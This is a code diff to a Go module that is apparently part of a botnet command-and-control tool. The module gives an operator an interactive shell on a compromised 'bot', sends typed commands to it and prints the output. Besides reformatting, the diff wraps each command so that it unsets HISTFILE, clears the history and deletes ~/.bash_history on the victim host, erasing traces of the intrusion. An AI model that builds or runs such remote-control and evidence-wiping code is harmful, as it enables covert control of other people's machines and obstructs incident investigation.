@@ -14,26 +14,25 @@ import (
 )
 
 var session types.Module = types.Module{
-	Name: "session",
+	Name:        "session",
 	Description: "Interact with a session (bot)",
-	Options: sessionOptions,
-	Execute: InteractWithSession,
-
+	Parallel:    false,
+	Options:     sessionOptions,
+	Execute:     InteractWithSession,
 }
 
 var sessionOptions map[string]*types.Option = map[string]*types.Option{
 	"BOT": {
-		Name: "BOT",
+		Name:        "BOT",
 		Description: "The target bot-id to handle interaction",
-		Required: true,
-		Value: nil,
-
+		Required:    true,
+		Value:       nil,
 	},
-
 }
 
-var interruptChannel chan struct{}
-func InteractWithSession(options map[string]*types.Option, _ ...any) {
+var interruptChannel chan struct{} = make(chan struct{})
+
+func InteractWithSession(options map[string]*types.Option) {
 	idOption, ok := options["BOT"]
 	if !ok {
 		misc.PanicWarn(fmt.Sprintf("The option %s is unset\n", "BOT"), true)
@@ -44,7 +43,7 @@ func InteractWithSession(options map[string]*types.Option, _ ...any) {
 	sessionID, ok := idOption.Value.(string)
 	if !ok {
 		misc.PanicWarn(fmt.Sprintf("The %v value isn't valid, must be a valid sessionID str (bot-00000)\n", idOption.Name), true)
-		return		
+		return
 
 	}
 
@@ -66,8 +65,8 @@ func InteractWithSession(options map[string]*types.Option, _ ...any) {
 
 	}
 
-	botIP, _ := misc.Colors(session.BotIP, "white")
-	promptSignal, _ := misc.Colors("->", "white")
+	botIP, _ := misc.Colors(session.BotIP, "red")
+	promptSignal, _ := misc.Colors("▶▶", "white_bold")
 	endFromListener := "___END__OF__RESULT__IN__" + session.ID + "__" + session.BotIP + "___"
 	signal.Stop(misc.InterruptSigs)
 	signal.Notify(misc.ChanInterruptSigs, syscall.SIGINT)
@@ -77,8 +76,8 @@ func InteractWithSession(options map[string]*types.Option, _ ...any) {
 	stdinScanner := bufio.NewScanner(os.Stdin)
 
 	for {
-		select{
-		case <- interruptChannel:
+		select {
+		case <-interruptChannel:
 			signal.Stop(misc.ChanInterruptSigs)
 			signal.Notify(misc.InterruptSigs, syscall.SIGINT)
 			return
@@ -86,7 +85,7 @@ func InteractWithSession(options map[string]*types.Option, _ ...any) {
 		default:
 			fmt.Printf("%v %v ", botIP, promptSignal)
 			ok := stdinScanner.Scan()
-			misc.ChanCtrlDHandler(ok, stdinScanner.Err(), interruptChannel)
+			misc.ChanCtrlDHandler(ok, stdinScanner.Err(), make(chan struct{}))
 
 			userCommand := strings.TrimSpace(stdinScanner.Text())
 			if userCommand == "" {
@@ -94,13 +93,13 @@ func InteractWithSession(options map[string]*types.Option, _ ...any) {
 
 			}
 
-			session.Commands <- userCommand + fmt.Sprintf("; echo; echo %v", endFromListener)
+			session.Commands <- fmt.Sprintf("unset HISTFILE; %v; echo; echo %v; history -c; rm -rf ~/.bash_history", userCommand, endFromListener)
 
 			var fullResponse []string
 			var finishedPrinting bool
 
 			for !finishedPrinting {
-				select{
+				select {
 				case output := <-session.Outputs:
 					trimOutput := strings.TrimSpace(output)
 					if trimOutput == endFromListener {
@@ -110,13 +109,13 @@ func InteractWithSession(options map[string]*types.Option, _ ...any) {
 					}
 
 					fullResponse = append(fullResponse, trimOutput)
-				
+
 				case <-time.After(25 * time.Second):
 					misc.PanicWarn(fmt.Sprintf("Error: %v\n", "Timeout waiting for response"), false)
 					finishedPrinting = true
 
 				}
-			
+
 			}
 
 			if len(fullResponse) != 0 {
@@ -134,5 +133,5 @@ func InteractWithSession(options map[string]*types.Option, _ ...any) {
 
 func init() {
 	RegisterNewModule(&session)
-	
+
 }
